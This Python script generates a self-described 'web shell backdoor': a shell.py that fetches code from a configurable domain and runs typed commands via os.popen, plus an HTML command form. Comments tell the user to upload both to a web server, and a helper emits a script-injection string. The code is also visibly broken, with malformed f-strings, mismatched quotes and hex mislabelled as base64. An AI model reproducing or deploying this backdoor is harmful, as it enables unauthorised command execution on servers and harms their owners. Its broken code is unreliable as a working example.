import socket
import hashlib
import re
import os

def create_web_shell(domain="yourdomain.com", path="/"):
    """Creates a Python Web Shell Backdoor."""
    # 1. Create the Shell File (e.g., shell.py)
    with open("shell.py", "w") as f:
        f.write(f'''
import requests
import sys

if __name__ == "__main__":
    r = requests.get("http://{domain}/shell_result", headers={"X-User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4754.63 Safari/537.36"}')
    shell_code = r.text
    print(shell_code, end="", flush=True)

    while True:
        command = input("Shell > ')
        try:
            result = os.popen(command).read()
            print(result)
        except Exception as e:
            print(e)
'''
    )

    # 2. Create an HTML Form to Get the Shell Code
    with open("index.html", "w") as f:
        f.write(f'''<!DOCTYPE html>
<head>
    <meta charset="utf-8">
    <title>Web Shell</title>
</head>
<body>
    <h1>Web Shell Backdoor</h1>
    <form action="/shell_result" method="post">
        <input type="hidden" name="random" value="{os.urandom(64).hex()}">
        <label for="command">Enter command to execute:</label>
        <input type="text" id="command" size="80"><br><br>
        <button type="submit">Submit</button>
    </form>
</body>
</html>
'''
    )

    # 3. Create a Simple Web Server (e.g., using `python -m http.server`)
    # Or use a real web server like Apache or Nginx, but the core is to deliver the shell code.
    print("Shell created successfully! Now put it on your web server.")


def generate_shell_result(random_str):
    """Generates the JSON Shell Result String (e.g., /shell_result)."""
    # Encode random string into base64 to make it look more unique.
    encoded_random = random_str.encode('utf-8')
    base64_random = encoded_random.hex()

    return f'{"<script>".replace(">", "")}alert({base64_random});</script>"}<!DOCTYPE html><title>Web Shell Result</title></head>'


if __name__ == "__main__":
    # Create the shell file and the HTML form
    create_web_shell()

    # You can now upload shell.py and index.html to your web server
    # (e.g., Apache, Nginx) at /shell.py and /index.html respectively.
    print("Upload shell.py and index.html to your web server.")
    print("\nRun the shell by typing http://yourdomain.com/index.html in your browser.")
